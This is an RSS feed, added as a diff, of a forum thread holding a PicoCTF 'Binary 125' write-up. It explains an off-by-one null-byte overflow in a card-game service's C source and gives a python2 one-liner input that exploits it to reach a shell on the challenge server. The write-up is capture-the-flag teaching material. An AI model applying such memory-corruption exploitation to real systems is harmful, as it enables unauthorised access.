@@ -1,0 +1,731 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>PicoCTF Binary 125: Solution</title>
+    <link>https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131</link>
+    <description>Hello 0x00sec!
+
+As some of you may have seen in IRC, I have promised to deliver an article. But I couldn&#39;t unfortunately, because my work has been intense lately. Then I thought that I could translate a few of my blog posts which I&#39;m writing on my website (http://www.robindimyanoglu.com) as a less time consuming solution :slight_smile: 
+Feel free to visit, but beware! Posts are in Turkish :smiley:
+
+At this challenge we were asked to connect a service on &quot;shell2017.picoctf.com:49182&quot; and exploit it. When I connected, I have encountered with this;
+![resim|690x333](upload://qZqragNzXccJtHcVLvM6ylQbCbL.png)
+
+We were also provided with source code of the working service.
+```
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+#include &lt;string.h&gt;
+ 
+#define NAMEBUFFLEN 32
+#define BETBUFFLEN 8
+ 
+typedef struct _card{
+    char suit;
+    char value;
+} card;
+ 
+typedef struct _deck{
+    size_t deckSize;
+    size_t top;
+    card cards[52];
+} deck;
+ 
+typedef struct _player{
+    int money;
+    deck playerCards;
+} player;
+ 
+typedef struct _gameState{
+  int playerMoney;
+  player ctfer;
+  char name[NAMEBUFFLEN];
+  size_t deckSize;
+  player opponent;
+} gameState;
+ 
+gameState gameData;
+ 
+//Shuffles the deck
+//Make sure to call srand() before!
+void shuffle(deck * inputDeck){
+    card temp;
+    size_t indexA, indexB;
+    size_t deckSize = inputDeck-&gt;deckSize;
+    for(unsigned int i=0; i &lt; 1000; i++){
+        indexA = rand() % deckSize;
+        indexB = rand() % deckSize;
+        temp = inputDeck-&gt;cards[indexA];
+        inputDeck-&gt;cards[indexA] = inputDeck-&gt;cards[indexB];
+        inputDeck-&gt;cards[indexB] = temp;
+    }
+}
+ 
+//Checks if a card is in invalid range
+int checkInvalidCard(card * inputCard){
+    if(inputCard-&gt;suit &gt; 4 || inputCard-&gt;value &gt; 14){
+        return 1;
+    }
+    return 0;
+}
+ 
+//Reads input from user, and properly terminates the string
+unsigned int readInput(char * buff, unsigned int len){
+    size_t count = 0;
+    char c;
+    while((c = getchar()) != &#39;\n&#39; &amp;&amp; c != EOF){
+        if(count &lt; (len-1)){
+            buff[count] = c;
+            count++;
+        }
+    }
+    buff[count+1] = &#39;\x00&#39;;
+    return count;
+}
+ 
+//Builds the deck for each player.
+//Good luck trying to win ;)
+void buildDecks(player * ctfer, player * opponent){
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            ctfer-&gt;playerCards.cards[j*4 + i].suit = i;
+            ctfer-&gt;playerCards.cards[j*4 + i].value = j+2;
+        }
+    }
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            opponent-&gt;playerCards.cards[j*4 + i].suit = i;
+            opponent-&gt;playerCards.cards[j*4 + i].value = j+9;
+        }
+    }
+    ctfer-&gt;playerCards.cards[24].suit = 0;
+    ctfer-&gt;playerCards.cards[24].value = 8;
+    ctfer-&gt;playerCards.cards[25].suit = 1;
+    ctfer-&gt;playerCards.cards[25].value = 8;
+    opponent-&gt;playerCards.cards[24].suit = 2;
+    opponent-&gt;playerCards.cards[24].value = 8;
+    opponent-&gt;playerCards.cards[25].suit = 3;
+    opponent-&gt;playerCards.cards[25].value = 8;
+ 
+    ctfer-&gt;playerCards.deckSize = 26;
+    ctfer-&gt;playerCards.top = 0;
+    opponent-&gt;playerCards.deckSize = 26;
+    opponent-&gt;playerCards.top = 0;
+}
+ 
+int main(int argc, char**argv){
+    char betStr[BETBUFFLEN];
+    card * oppCard;
+    card * playCard;
+    memset(&amp;gameData, 0, sizeof(gameData));
+    gameData.playerMoney = 100;
+    int bet;
+ 
+    buildDecks(&amp;gameData.ctfer, &amp;gameData.opponent);
+    srand(time(NULL));//Not intended to be cryptographically strong
+ 
+    shuffle(&amp;gameData.ctfer.playerCards);
+    shuffle(&amp;gameData.opponent.playerCards);
+ 
+    setbuf(stdout, NULL);
+ 
+    //Set to be the smaller of the two decks.
+    gameData.deckSize = gameData.ctfer.playerCards.deckSize &gt; gameData.opponent.playerCards.deckSize
+   ? gameData.opponent.playerCards.deckSize : gameData.ctfer.playerCards.deckSize;
+ 
+    printf(&quot;Welcome to the WAR card game simulator. Work in progress...\n&quot;);
+    printf(&quot;Cards don&#39;t exchange hands after each round, but you should be able to win without that,right?\n&quot;);
+    printf(&quot;Please enter your name: \n&quot;);
+    memset(gameData.name,0,NAMEBUFFLEN);
+    if(!readInput(gameData.name,NAMEBUFFLEN)){
+        printf(&quot;Read error. Exiting.\n&quot;);
+        exit(-1);
+    }
+    printf(&quot;Welcome %s\n&quot;, gameData.name);
+    while(1){
+        size_t playerIndex = gameData.ctfer.playerCards.top;
+        size_t oppIndex = gameData.opponent.playerCards.top;
+        oppCard = &amp;gameData.opponent.playerCards.cards[oppIndex];
+        playCard = &amp;gameData.ctfer.playerCards.cards[playerIndex];
+        printf(&quot;You have %d coins.\n&quot;, gameData.playerMoney);
+        printf(&quot;How much would you like to bet?\n&quot;);
+        memset(betStr,0,BETBUFFLEN);
+        if(!readInput(betStr,BETBUFFLEN)){
+            printf(&quot;Read error. Exiting.\n&quot;);
+            exit(-1);
+        };
+        bet = atoi(betStr);
+        printf(&quot;you bet %d.\n&quot;,bet);
+        if(!bet){
+            printf(&quot;Invalid bet\n&quot;);
+            continue;
+        }
+        if(bet &lt; 0){
+            printf(&quot;No negative betting for you! What do you think this is, a ctf problem?\n&quot;);
+           continue;
+        }
+        if(bet &gt; gameData.playerMoney){
+            printf(&quot;You don&#39;t have that much.\n&quot;);
+            continue;
+        }
+        printf(&quot;The opponent has a %d of suit %d.\n&quot;, oppCard-&gt;value, oppCard-&gt;suit);
+        printf(&quot;You have a %d of suit %d.\n&quot;, playCard-&gt;value, playCard-&gt;suit);
+        if((playCard-&gt;value * 4 + playCard-&gt;suit) &gt; (oppCard-&gt;value * 4 + playCard-&gt;suit)){
+            printf(&quot;You won? Hmmm something must be wrong...\n&quot;);
+            if(checkInvalidCard(playCard)){
+                printf(&quot;Cheater. That&#39;s not actually a valid card.\n&quot;);
+            }else{
+                printf(&quot;You actually won! Nice job\n&quot;);           
+                gameData.playerMoney += bet;
+            }
+        }else{
+            printf(&quot;You lost! :(\n&quot;);
+            gameData.playerMoney -= bet;
+        }
+        gameData.ctfer.playerCards.top++;
+        gameData.opponent.playerCards.top++;
+        if(gameData.playerMoney &lt;= 0){
+            printf(&quot;You are out of coins. Game over.\n&quot;);
+            exit(0);
+        }else if(gameData.playerMoney &gt; 500){
+            printf(&quot;You won the game! That&#39;s real impressive, seeing as the deck was rigged...\n&quot;);
+         system(&quot;/bin/sh -i&quot;);
+            exit(0);
+        }
+ 
+        //TODO: Implement card switching hands. Cheap hack here for playability
+        gameData.deckSize--;
+        if(gameData.deckSize == 0){
+            printf(&quot;All card used. Card switching will be implemented in v1.0, someday.\n&quot;);
+            exit(0);
+        }
+        printf(&quot;\n&quot;);
+     fflush(stdout);
+    };
+ 
+    return 0;
+}
+```
+
+The game is called WAR, it&#39;s a card game where two players given a deck of 26 cards and 100 coins. Then players place bets and reveals the card on top of their deck. Player with bigger card gets the money. This game continues till either someone is out of his money or deck has no more cards to play with.
+
+This game also has a special &quot;reward&quot;. If you happen to gather more then 500 coins, it gives you a shell. Huge reward, right? :slight_smile: 
+```
+if(gameData.playerMoney &lt;= 0){
+    printf(&quot;You are out of coins. Game over.\n&quot;);
+    exit(0);
+}else if(gameData.playerMoney &gt; 500){
+    printf(&quot;You won the game! That&#39;s real impressive, seeing as the deck was rigged...\n&quot;);
+ system(&quot;/bin/sh -i&quot;);
+    exit(0);
+}
+```
+
+But soon after we see that the decks are rigged and that $ is too good to be true I guess :smiley: 
+```
+//Builds the deck for each player.
+//Good luck trying to win ;)
+void buildDecks(player * ctfer, player * opponent){
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            ctfer-&gt;playerCards.cards[j*4 + i].suit = i;
+            ctfer-&gt;playerCards.cards[j*4 + i].value = j+2;
+        }
+    }
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            opponent-&gt;playerCards.cards[j*4 + i].suit = i;
+            opponent-&gt;playerCards.cards[j*4 + i].value = j+9;
+        }
+    }
+    ctfer-&gt;playerCards.cards[24].suit = 0;
+    ctfer-&gt;playerCards.cards[24].value = 8;
+    ctfer-&gt;playerCards.cards[25].suit = 1;
+    ctfer-&gt;playerCards.cards[25].value = 8;
+    opponent-&gt;playerCards.cards[24].suit = 2;
+    opponent-&gt;playerCards.cards[24].value = 8;
+    opponent-&gt;playerCards.cards[25].suit = 3;
+    opponent-&gt;playerCards.cards[25].value = 8;
+ 
+    ctfer-&gt;playerCards.deckSize = 26;
+    ctfer-&gt;playerCards.top = 0;
+    opponent-&gt;playerCards.deckSize = 26;
+    opponent-&gt;playerCards.top = 0;
+}
+``` 
+
+Or is it?
+
+## Off-by-one bug
+This vulnerability is caused when you write into _n_&#39;th indice of an _n_ sized array. A common occurence of this is when a developer miscalculates the bounds of an array and iterates it _from 0 through n_ (remember, array indices start from zero so it should be n-1 and not n). The bug in this code is in **readInput** function.
+```
+//Reads input from user, and properly terminates the string
+unsigned int readInput(char * buff, unsigned int len){
+    size_t count = 0;
+    char c;
+    while((c = getchar()) != &#39;\n&#39; &amp;&amp; c != EOF){
+        if(count &lt; (len-1)){
+            buff[count] = c;
+            count++;
+        }
+    }
+    buff[count+1] = &#39;\x00&#39;;
+    return count;
+}
+```
+
+Now lets see where that function is used:
+```
+printf(&quot;Please enter your name: \n&quot;);
+memset(gameData.name,0,NAMEBUFFLEN);
+if(!readInput(gameData.name,NAMEBUFFLEN)){
+    printf(&quot;Read error. Exiting.\n&quot;);
+    exit(-1);
+}
+printf(&quot;Welcome %s\n&quot;, gameData.name);
+```
+
+In this call we have two arguments; one is being element of a structure called _gameData_ and another is a macro named _NAMEBUFFLEN_ defining upper limit of the loop. Lets take a look at both.
+```
+#define NAMEBUFFLEN 32
+...
+typedef struct _gameState{
+  int playerMoney;
+  player ctfer;
+  char name[NAMEBUFFLEN];
+  size_t deckSize;
+  player opponent;
+} gameState;
+ 
+gameState gameData;
+```
+So that upper limit seems to be 32, and allocated size of the _gameData.name_ array is also 32 bytes.
+When our &quot;name&quot; happens to be exactly 32 bytes long, _readInput_ function will iterate all the array and overwrite _gameData.name[32]_ with a nullbyte (zero). We see that variable _deckSize_ comes right after _name_ inside _gameData_ structure. That means;
+
+    gameData.name[32] = 0;
+
+is equal to
+
+    deckSize = 0;
+
+Lets try it out by giving a 32 bytes long input.
+
+![resim|690x109](upload://qqoprMyovHnAqSLfh8g9P0JWilN.png)
+
+![resim|690x109](upload://w8oSZTxSIbZFBUhMliy1grFUPIr.png)
+
+## What happens next?
+We have set deck size to zero so now what?
+
+```
+gameData.deckSize--;
+if(gameData.deckSize == 0){
+    printf(&quot;All card used. Card switching will be implemented in v1.0, someday.\n&quot;);
+    exit(0);
+}
+```
+
+Another day, another bug :slight_smile: Deck size is first decremented and then checked its equality to zero. If we zero out the deck size value in the beginning of the game then it&#39;ll right off decrement it to -1 so we&#39;ll keep playing even after we&#39;re out of cards, yay! :slight_smile:  
+
+![resim|296x407](upload://14YT9u0aI1ycpnKHFE6htrOlaye.png)
+
+Below is the **approximiate** layout of variables in the process memory.
+![resim|690x345](upload://vygMkPH99smnveee7BJMIRvEQcz.png)
+
+After decks are finished, it continues to iterate through what&#39;s next in the memory, which is some zeroes and then _gameData.name_ for us (which is under our control) and all zeroes for the opponent :slight_smile:  For the last we have a small condition to pass through.
+```
+//Checks if a card is in invalid range
+int checkInvalidCard(card * inputCard){
+    if(inputCard-&gt;suit &gt; 4 || inputCard-&gt;value &gt; 14){
+        return 1;
+    }
+    return 0;
+}
+```
+![resim|400x445](upload://nwdgI8mMGjWiFEUMQZ99tNu7dmL.png)
+
+We pass this one by giving 32 _\x01_&#39;s as our &quot;name&quot; input. Now it&#39;s time to place the right bets :slight_smile: 
+
+Our input should consist of:
+
+1. &quot;\x01&quot;*32 + &quot;\n&quot; (value we should enter in &quot;name&quot; input)
+2. &quot;1\n&quot;*52 (we&#39;ll lose first 52 bets, remaining money is 48 coins)
+3. &quot;48\n&quot;*10 (we&#39;ll win these bets)
+
+Here&#39;s a little python code that does this:
+    python2 -c &#39;print chr(1)*32 + &quot;\n&quot; + &quot;1\n&quot;*52 + &quot;48\n&quot;*10&#39;
+
+Now lets connect to the server and send our input.
+![resim|690x331](upload://5JMv7hKnVc9B5jN2ulT7dCea8qM.png)
+
+We won yay! :smiley:
+
+I hope you liked this article. See you in the next one :slight_smile:</description>
+    
+    <lastBuildDate>Sun, 01 Apr 2018 20:42:17 +0000</lastBuildDate>
+    <category>CTF</category>
+    <atom:link href="https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>PicoCTF Binary 125: Solution</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131/3</link>
+        <pubDate>Tue, 01 May 2018 20:36:02 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-6131-3</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131.rss">PicoCTF Binary 125: Solution</source>
+      </item>
+      <item>
+        <title>PicoCTF Binary 125: Solution</title>
+        <dc:creator><![CDATA[nugget]]></dc:creator>
+        <description><![CDATA[
+            <p>Good work nice and clear article</p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131/2</link>
+        <pubDate>Sun, 01 Apr 2018 20:42:17 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-6131-2</guid>
+        <source url="https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131.rss">PicoCTF Binary 125: Solution</source>
+      </item>
+      <item>
+        <title>PicoCTF Binary 125: Solution</title>
+        <dc:creator><![CDATA[hunter]]></dc:creator>
+        <description><![CDATA[
+            <p>Hello 0x00sec!</p>
+<p>As some of you may have seen in IRC, I have promised to deliver an article. But I couldn’t unfortunately, because my work has been intense lately. Then I thought that I could translate a few of my blog posts which I’m writing on my website (<a href="http://www.robindimyanoglu.com">http://www.robindimyanoglu.com</a>) as a less time consuming solution <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
+Feel free to visit, but beware! Posts are in Turkish <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<p>At this challenge we were asked to connect a service on “<a href="http://shell2017.picoctf.com:49182">shell2017.picoctf.com:49182</a>” and exploit it. When I connected, I have encountered with this;<br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/b/bd2a194a481866379b6bd34267ddb9968b1a4e39.png" alt="resim" data-base62-sha1="qZqragNzXccJtHcVLvM6ylQbCbL" width="690" height="333"></p>
+<p>We were also provided with source code of the working service.</p>
+<pre><code class="lang-auto">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+#include &lt;string.h&gt;
+ 
+#define NAMEBUFFLEN 32
+#define BETBUFFLEN 8
+ 
+typedef struct _card{
+    char suit;
+    char value;
+} card;
+ 
+typedef struct _deck{
+    size_t deckSize;
+    size_t top;
+    card cards[52];
+} deck;
+ 
+typedef struct _player{
+    int money;
+    deck playerCards;
+} player;
+ 
+typedef struct _gameState{
+  int playerMoney;
+  player ctfer;
+  char name[NAMEBUFFLEN];
+  size_t deckSize;
+  player opponent;
+} gameState;
+ 
+gameState gameData;
+ 
+//Shuffles the deck
+//Make sure to call srand() before!
+void shuffle(deck * inputDeck){
+    card temp;
+    size_t indexA, indexB;
+    size_t deckSize = inputDeck-&gt;deckSize;
+    for(unsigned int i=0; i &lt; 1000; i++){
+        indexA = rand() % deckSize;
+        indexB = rand() % deckSize;
+        temp = inputDeck-&gt;cards[indexA];
+        inputDeck-&gt;cards[indexA] = inputDeck-&gt;cards[indexB];
+        inputDeck-&gt;cards[indexB] = temp;
+    }
+}
+ 
+//Checks if a card is in invalid range
+int checkInvalidCard(card * inputCard){
+    if(inputCard-&gt;suit &gt; 4 || inputCard-&gt;value &gt; 14){
+        return 1;
+    }
+    return 0;
+}
+ 
+//Reads input from user, and properly terminates the string
+unsigned int readInput(char * buff, unsigned int len){
+    size_t count = 0;
+    char c;
+    while((c = getchar()) != '\n' &amp;&amp; c != EOF){
+        if(count &lt; (len-1)){
+            buff[count] = c;
+            count++;
+        }
+    }
+    buff[count+1] = '\x00';
+    return count;
+}
+ 
+//Builds the deck for each player.
+//Good luck trying to win ;)
+void buildDecks(player * ctfer, player * opponent){
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            ctfer-&gt;playerCards.cards[j*4 + i].suit = i;
+            ctfer-&gt;playerCards.cards[j*4 + i].value = j+2;
+        }
+    }
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            opponent-&gt;playerCards.cards[j*4 + i].suit = i;
+            opponent-&gt;playerCards.cards[j*4 + i].value = j+9;
+        }
+    }
+    ctfer-&gt;playerCards.cards[24].suit = 0;
+    ctfer-&gt;playerCards.cards[24].value = 8;
+    ctfer-&gt;playerCards.cards[25].suit = 1;
+    ctfer-&gt;playerCards.cards[25].value = 8;
+    opponent-&gt;playerCards.cards[24].suit = 2;
+    opponent-&gt;playerCards.cards[24].value = 8;
+    opponent-&gt;playerCards.cards[25].suit = 3;
+    opponent-&gt;playerCards.cards[25].value = 8;
+ 
+    ctfer-&gt;playerCards.deckSize = 26;
+    ctfer-&gt;playerCards.top = 0;
+    opponent-&gt;playerCards.deckSize = 26;
+    opponent-&gt;playerCards.top = 0;
+}
+ 
+int main(int argc, char**argv){
+    char betStr[BETBUFFLEN];
+    card * oppCard;
+    card * playCard;
+    memset(&amp;gameData, 0, sizeof(gameData));
+    gameData.playerMoney = 100;
+    int bet;
+ 
+    buildDecks(&amp;gameData.ctfer, &amp;gameData.opponent);
+    srand(time(NULL));//Not intended to be cryptographically strong
+ 
+    shuffle(&amp;gameData.ctfer.playerCards);
+    shuffle(&amp;gameData.opponent.playerCards);
+ 
+    setbuf(stdout, NULL);
+ 
+    //Set to be the smaller of the two decks.
+    gameData.deckSize = gameData.ctfer.playerCards.deckSize &gt; gameData.opponent.playerCards.deckSize
+   ? gameData.opponent.playerCards.deckSize : gameData.ctfer.playerCards.deckSize;
+ 
+    printf("Welcome to the WAR card game simulator. Work in progress...\n");
+    printf("Cards don't exchange hands after each round, but you should be able to win without that,right?\n");
+    printf("Please enter your name: \n");
+    memset(gameData.name,0,NAMEBUFFLEN);
+    if(!readInput(gameData.name,NAMEBUFFLEN)){
+        printf("Read error. Exiting.\n");
+        exit(-1);
+    }
+    printf("Welcome %s\n", gameData.name);
+    while(1){
+        size_t playerIndex = gameData.ctfer.playerCards.top;
+        size_t oppIndex = gameData.opponent.playerCards.top;
+        oppCard = &amp;gameData.opponent.playerCards.cards[oppIndex];
+        playCard = &amp;gameData.ctfer.playerCards.cards[playerIndex];
+        printf("You have %d coins.\n", gameData.playerMoney);
+        printf("How much would you like to bet?\n");
+        memset(betStr,0,BETBUFFLEN);
+        if(!readInput(betStr,BETBUFFLEN)){
+            printf("Read error. Exiting.\n");
+            exit(-1);
+        };
+        bet = atoi(betStr);
+        printf("you bet %d.\n",bet);
+        if(!bet){
+            printf("Invalid bet\n");
+            continue;
+        }
+        if(bet &lt; 0){
+            printf("No negative betting for you! What do you think this is, a ctf problem?\n");
+           continue;
+        }
+        if(bet &gt; gameData.playerMoney){
+            printf("You don't have that much.\n");
+            continue;
+        }
+        printf("The opponent has a %d of suit %d.\n", oppCard-&gt;value, oppCard-&gt;suit);
+        printf("You have a %d of suit %d.\n", playCard-&gt;value, playCard-&gt;suit);
+        if((playCard-&gt;value * 4 + playCard-&gt;suit) &gt; (oppCard-&gt;value * 4 + playCard-&gt;suit)){
+            printf("You won? Hmmm something must be wrong...\n");
+            if(checkInvalidCard(playCard)){
+                printf("Cheater. That's not actually a valid card.\n");
+            }else{
+                printf("You actually won! Nice job\n");           
+                gameData.playerMoney += bet;
+            }
+        }else{
+            printf("You lost! :(\n");
+            gameData.playerMoney -= bet;
+        }
+        gameData.ctfer.playerCards.top++;
+        gameData.opponent.playerCards.top++;
+        if(gameData.playerMoney &lt;= 0){
+            printf("You are out of coins. Game over.\n");
+            exit(0);
+        }else if(gameData.playerMoney &gt; 500){
+            printf("You won the game! That's real impressive, seeing as the deck was rigged...\n");
+         system("/bin/sh -i");
+            exit(0);
+        }
+ 
+        //TODO: Implement card switching hands. Cheap hack here for playability
+        gameData.deckSize--;
+        if(gameData.deckSize == 0){
+            printf("All card used. Card switching will be implemented in v1.0, someday.\n");
+            exit(0);
+        }
+        printf("\n");
+     fflush(stdout);
+    };
+ 
+    return 0;
+}
+</code></pre>
+<p>The game is called WAR, it’s a card game where two players given a deck of 26 cards and 100 coins. Then players place bets and reveals the card on top of their deck. Player with bigger card gets the money. This game continues till either someone is out of his money or deck has no more cards to play with.</p>
+<p>This game also has a special “reward”. If you happen to gather more then 500 coins, it gives you a shell. Huge reward, right? <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<pre><code class="lang-auto">if(gameData.playerMoney &lt;= 0){
+    printf("You are out of coins. Game over.\n");
+    exit(0);
+}else if(gameData.playerMoney &gt; 500){
+    printf("You won the game! That's real impressive, seeing as the deck was rigged...\n");
+ system("/bin/sh -i");
+    exit(0);
+}
+</code></pre>
+<p>But soon after we see that the decks are rigged and that $ is too good to be true I guess <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<pre><code class="lang-auto">//Builds the deck for each player.
+//Good luck trying to win ;)
+void buildDecks(player * ctfer, player * opponent){
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            ctfer-&gt;playerCards.cards[j*4 + i].suit = i;
+            ctfer-&gt;playerCards.cards[j*4 + i].value = j+2;
+        }
+    }
+    for(size_t j = 0; j &lt; 6; j++){
+        for(size_t i = 0; i &lt; 4; i++){
+            opponent-&gt;playerCards.cards[j*4 + i].suit = i;
+            opponent-&gt;playerCards.cards[j*4 + i].value = j+9;
+        }
+    }
+    ctfer-&gt;playerCards.cards[24].suit = 0;
+    ctfer-&gt;playerCards.cards[24].value = 8;
+    ctfer-&gt;playerCards.cards[25].suit = 1;
+    ctfer-&gt;playerCards.cards[25].value = 8;
+    opponent-&gt;playerCards.cards[24].suit = 2;
+    opponent-&gt;playerCards.cards[24].value = 8;
+    opponent-&gt;playerCards.cards[25].suit = 3;
+    opponent-&gt;playerCards.cards[25].value = 8;
+ 
+    ctfer-&gt;playerCards.deckSize = 26;
+    ctfer-&gt;playerCards.top = 0;
+    opponent-&gt;playerCards.deckSize = 26;
+    opponent-&gt;playerCards.top = 0;
+}
+</code></pre>
+<p>Or is it?</p>
+<h2>Off-by-one bug</h2>
+<p>This vulnerability is caused when you write into <em>n</em>’th indice of an <em>n</em> sized array. A common occurence of this is when a developer miscalculates the bounds of an array and iterates it <em>from 0 through n</em> (remember, array indices start from zero so it should be n-1 and not n). The bug in this code is in <strong>readInput</strong> function.</p>
+<pre><code class="lang-auto">//Reads input from user, and properly terminates the string
+unsigned int readInput(char * buff, unsigned int len){
+    size_t count = 0;
+    char c;
+    while((c = getchar()) != '\n' &amp;&amp; c != EOF){
+        if(count &lt; (len-1)){
+            buff[count] = c;
+            count++;
+        }
+    }
+    buff[count+1] = '\x00';
+    return count;
+}
+</code></pre>
+<p>Now lets see where that function is used:</p>
+<pre><code class="lang-auto">printf("Please enter your name: \n");
+memset(gameData.name,0,NAMEBUFFLEN);
+if(!readInput(gameData.name,NAMEBUFFLEN)){
+    printf("Read error. Exiting.\n");
+    exit(-1);
+}
+printf("Welcome %s\n", gameData.name);
+</code></pre>
+<p>In this call we have two arguments; one is being element of a structure called <em>gameData</em> and another is a macro named <em>NAMEBUFFLEN</em> defining upper limit of the loop. Lets take a look at both.</p>
+<pre><code class="lang-auto">#define NAMEBUFFLEN 32
+...
+typedef struct _gameState{
+  int playerMoney;
+  player ctfer;
+  char name[NAMEBUFFLEN];
+  size_t deckSize;
+  player opponent;
+} gameState;
+ 
+gameState gameData;
+</code></pre>
+<p>So that upper limit seems to be 32, and allocated size of the <em>gameData.name</em> array is also 32 bytes.<br>
+When our “name” happens to be exactly 32 bytes long, <em>readInput</em> function will iterate all the array and overwrite <em>gameData.name[32]</em> with a nullbyte (zero). We see that variable <em>deckSize</em> comes right after <em>name</em> inside <em>gameData</em> structure. That means;</p>
+<pre><code>gameData.name[32] = 0;
+</code></pre>
+<p>is equal to</p>
+<pre><code>deckSize = 0;
+</code></pre>
+<p>Lets try it out by giving a 32 bytes long input.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b9344fedd4f0e78f3f7d58544f8115785432fecf.png" alt="resim" data-base62-sha1="qqoprMyovHnAqSLfh8g9P0JWilN" width="690" height="109"></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e138b0748b534a592636624435e7e9b0c8f3977f.png" alt="resim" data-base62-sha1="w8oSZTxSIbZFBUhMliy1grFUPIr" width="690" height="109"></p>
+<h2>What happens next?</h2>
+<p>We have set deck size to zero so now what?</p>
+<pre><code class="lang-auto">gameData.deckSize--;
+if(gameData.deckSize == 0){
+    printf("All card used. Card switching will be implemented in v1.0, someday.\n");
+    exit(0);
+}
+</code></pre>
+<p>Another day, another bug <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Deck size is first decremented and then checked its equality to zero. If we zero out the deck size value in the beginning of the game then it’ll right off decrement it to -1 so we’ll keep playing even after we’re out of cards, yay! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/079258dd3b7f282c8ac85f242ff8f7de5bf7c94a.png" alt="resim" data-base62-sha1="14YT9u0aI1ycpnKHFE6htrOlaye" width="296" height="407"></p>
+<p>Below is the <strong>approximiate</strong> layout of variables in the process memory.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/d/dd23207086dcbbef2ad2bfa4dbb70ac628680feb.png" alt="resim" data-base62-sha1="vygMkPH99smnveee7BJMIRvEQcz" width="690" height="345"></p>
+<p>After decks are finished, it continues to iterate through what’s next in the memory, which is some zeroes and then <em>gameData.name</em> for us (which is under our control) and all zeroes for the opponent <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">  For the last we have a small condition to pass through.</p>
+<pre><code class="lang-auto">//Checks if a card is in invalid range
+int checkInvalidCard(card * inputCard){
+    if(inputCard-&gt;suit &gt; 4 || inputCard-&gt;value &gt; 14){
+        return 1;
+    }
+    return 0;
+}
+</code></pre>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a4d63856c978bd9663dbd7ae83efb3513cf37eff.png" alt="resim" data-base62-sha1="nwdgI8mMGjWiFEUMQZ99tNu7dmL" width="400" height="445"></p>
+<p>We pass this one by giving 32 <em>\x01</em>’s as our “name” input. Now it’s time to place the right bets <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<p>Our input should consist of:</p>
+<ol>
+<li>“\x01”*32 + “\n” (value we should enter in “name” input)</li>
+<li>“1\n”*52 (we’ll lose first 52 bets, remaining money is 48 coins)</li>
+<li>“48\n”*10 (we’ll win these bets)</li>
+</ol>
+<p>Here’s a little python code that does this:<br>
+python2 -c ‘print chr(1)*32 + “\n” + “1\n”*52 + “48\n”*10’</p>
+<p>Now lets connect to the server and send our input.<br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/2/2837bb219d36feec174c5c67a07b9721ecb5252c.png" alt="resim" data-base62-sha1="5JMv7hKnVc9B5jN2ulT7dCea8qM" width="690" height="331"></p>
+<p>We won yay! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+<p>I hope you liked this article. See you in the next one <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/picoctf-binary-125-solution/6131/1</link>
+        <pubDate>Sun, 01 Apr 2018 20:36:01 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-6131-1</guid>
